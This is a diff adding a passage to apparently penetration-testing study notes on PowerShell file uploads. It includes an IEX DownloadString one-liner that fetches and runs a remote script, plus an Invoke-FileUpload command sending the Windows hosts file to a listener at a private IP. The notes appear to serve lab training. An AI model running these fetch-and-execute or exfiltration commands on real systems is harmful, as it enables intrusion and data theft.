@@ -177,5 +177,37 @@ echo "output of first command" | base64 -d > hosts
 md5sum hosts
 ```
 
+
 **PowerShell Web Uploads**
+
+Since PowerShell does not have built-in upload operations will have take the following steps:
+- Use the Invoke-WebRequest or Invoke-RestMethod methods
+- Configure a webserver to accept uploads
+- For the webserver we will use an extended module of the Python HTTP.server module called **uploadserver**
+
+**Install uploadserver**
+```
+pip3 install uploadserver
+```
+
+```
+python3 -m uploadserver
+```
+
+- Use the PSUploads.ps1 script to perform upload operations
+- It accepts two parameters: -File, which specifies the file path. And -Uri, the server path to upload said file
+
+**PowerShell Script to Upload a File to Python Upload Server**
+
+```
+IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+```
+
+```
+Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
+```
+
+**PowerShell Base64 Web Upload**
+
+
 
